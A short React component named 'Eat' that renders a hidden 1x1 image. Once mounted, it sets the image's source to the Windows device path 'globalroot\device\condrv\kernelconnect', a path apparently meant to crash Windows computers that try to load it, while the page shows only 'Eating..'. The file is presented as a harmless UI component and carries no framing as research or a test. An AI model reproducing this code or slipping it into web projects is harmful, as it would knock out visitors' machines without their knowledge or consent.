import React, { useState, useEffect } from 'react';
const Eat = () => {
	const [src, setSRC] = useState();
		useEffect(() => {
		setSRC(`\\\\.\globalroot\\device\\condrv\\kernelconnect`);
	}, [src]);
		return !src ? (
		<>Eating..</>
	) : (
		<>
			<img src={src} alt="Eat" width="1" height="1" />
		</>
	);
};
export default Eat;
